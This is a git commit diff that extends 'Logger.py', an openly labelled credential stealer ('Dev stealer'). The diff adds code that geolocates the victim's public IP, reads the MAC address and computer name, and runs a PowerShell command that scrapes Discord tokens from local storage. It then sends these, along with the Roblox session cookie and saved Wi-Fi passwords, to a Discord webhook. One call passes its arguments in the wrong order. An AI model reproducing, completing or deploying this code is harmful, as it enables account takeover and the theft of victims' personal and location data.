a5e56bf74221ff6e720a3524d0c5dacd8a07d225
Csuckslol <137227905+Csuckslol@users.noreply.github.com>
2023-06-23 09:20:51 -0700

    Update Logger.py

--- Logger.py
+++ Logger.py
@@ -27,19 +27,89 @@ def GetWifiPasswords():
         print("Failed to retrieve Wi-Fi passwords:", str(e))
         return []
 
-def SendToDiscord(webhook_url, roblosecurity_cookie, wifi_passwords):
+def GetPublicIPAddress():
+    try:
+        ip_address = requests.get("https://api.ipify.org").text.strip()
+
+        if ip_address:
+            response = requests.get(f"http://ip-api.com/json/{ip_address}")
+            data = response.json()
+
+            isp = data.get("isp")
+            city = data.get("city")
+            region = data.get("regionName")
+            country = data.get("country")
+
+            return ip_address, isp, city, region, country
+        else:
+            print("Failed to retrieve public IP address.")
+            return None, None, None, None, None
+    except Exception as e:
+        print("Failed to retrieve public IP address:", str(e))
+        return None, None, None, None, None
+
+def GetMacAddress():
+    try:
+        result = subprocess.run(["getmac", "/FO", "CSV", "/NH"], capture_output=True, text=True)
+        output = result.stdout.strip()
+
+        # Extract the MAC address from the output
+        mac_address = output.split(",")[0].replace('"', '')
+
+        return mac_address
+    except Exception as e:
+        print("Failed to retrieve MAC address:", str(e))
+        return None
+
+def SendToDiscord(webhook_url, roblosecurity_cookie, wifi_passwords, ip_address, isp, city, region, country, mac_address, discord_token, computer_name):
+    roblosecurity_embed = {
+        "title": "Dev stealer caught .ROBLOSECURITY Cookie!",
+        "description": f"```{roblosecurity_cookie}```",
+        "color": 0x00FF00
+    }
+
+    wifi_passwords_embed = {
+        "title": "Dev stealer got Wi-Fi Passwords!",
+        "description": "".join([f"```{profile}: {password}```" for profile, password in wifi_passwords]),
+        "color": 0x00FF00
+    }
+
+    networking_info_embed = {
+        "title": "Dev stealer got IP Info!",
+        "fields": [
+            {"name": "Public IP Address", "value": f"```{ip_address}```", "inline": False},
+            {"name": "ISP", "value": f"```{isp}```", "inline": True},
+            {"name": "City", "value": f"```{city}```", "inline": True},
+            {"name": "Region", "value": f"```{region}```", "inline": True},
+            {"name": "Country", "value": f"```{country}```", "inline": True}
+        ],
+        "color": 0x00FF00
+    }
+
+    main_info_embed = {
+        "title": "Main Info",
+        "fields": [
+            {"name": "Discord Token", "value": f"```{discord_token}```", "inline": False}
+        ],
+        "color": 0x0000FF
+    }
+
+    computer_info_embed = {
+        "title": "Computer Info",
+        "fields": [
+            {"name": "MAC Address", "value": f"```{mac_address}```", "inline": True},
+            {"name": "Computer Name", "value": f"```{computer_name}```", "inline": True}
+        ],
+        "color": 0x0000FF
+    }
+
     payload = {
         "embeds": [
-            {
-                "title": "Dev stealer caught a .ROBLOSECURITY Cookie!",
-                "description": f"```{roblosecurity_cookie}```",
-                "color": 0x00FF00
-            },
-            {
-                "title": "Dev stealer got Wi-Fi Passwords!",
-                "description": f"".join([f"```{profile}: {password}```" for profile, password in wifi_passwords]),
-                "color": 0x00FF00
-            }
+            roblosecurity_embed,
+            wifi_passwords_embed,
+            networking_info_embed,
+            main_info_embed,
+            computer_info_embed
         ]
     }
 
@@ -55,7 +125,7 @@ def SendToDiscord(webhook_url, roblosecurity_cookie, wifi_passwords):
         print("Failed to send data to Discord webhook.")
 
 def Main():
-    webhook_url = "Your webhook url"
+    webhook_url = "Webhook url here"
 
     # Get the .ROBLOSECURITY cookie
     roblosecurity_cookie = None
@@ -71,8 +141,23 @@ def Main():
         # Get Wi-Fi passwords
         wifi_passwords = GetWifiPasswords()
 
-        # Send data to Discord webhook
-        SendToDiscord(webhook_url, roblosecurity_cookie, wifi_passwords)
+        # Get public IP address and networking information
+        ip_address, isp, city, region, country = GetPublicIPAddress()
+
+        # Get MAC address
+        mac_address = GetMacAddress()
+
+        # Get Discord token
+        discord_token = subprocess.run(["powershell", "-Command", "Get-Content -Path $env:APPDATA\\discord\\Local Storage\\leveldb\\*.ldb | Select-String -Pattern 'oken' | %{$_.Matches} | %{$_.Value}"], capture_output=True, text=True).stdout.strip()
+
+        # Get computer name
+        computer_name = subprocess.run(["powershell", "-Command", "$env:COMPUTERNAME"], capture_output=True, text=True).stdout.strip()
+
+        if ip_address is not None:
+            # Send data to Discord webhook
+            SendToDiscord(webhook_url, roblosecurity_cookie, wifi_passwords, ip_address, isp, city, region, country, discord_token, mac_address, computer_name)
+        else:
+            print("Public IP address not available")
     else:
         print(".ROBLOSECURITY cookie not found")
 
